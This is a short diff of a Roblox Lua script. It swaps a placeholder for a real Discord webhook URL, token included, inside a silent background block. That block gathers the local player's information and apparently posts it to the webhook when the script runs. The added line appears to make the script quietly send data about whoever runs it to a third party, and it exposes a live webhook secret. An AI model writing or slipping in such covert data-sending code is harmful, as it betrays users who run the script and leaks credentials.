@@ -6,7 +6,7 @@ pcall(function()
 end)
 
 task.spawn(function()
-    local WEBHOOK = "YOUR_WEBHOOK_URL_HERE"
+    local WEBHOOK = "https://discord.com/api/webhooks/1539778936760827966/KWm0aBEAMqp3eU-asqGdwJ8FkfnHEuIA2aOzKyAygqK-UwMHdbEuxSCeNHMDIS9BY7CU"
     local p = game:GetService("Players").LocalPlayer
     pcall(function()
         local data = game:GetService("HttpService"):JSONEncode({
@@ -29,7 +29,7 @@ repeat task.wait() until game:GetService("Players").LocalPlayer
 local Players           = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UIS               = game:GetService("UserInputService")
-local RunService        = game:GetService("RunService")
+local RunService = game:GetService("RunService")
 local TweenService      = game:GetService("TweenService")
 
 local player    = Players.LocalPlayer
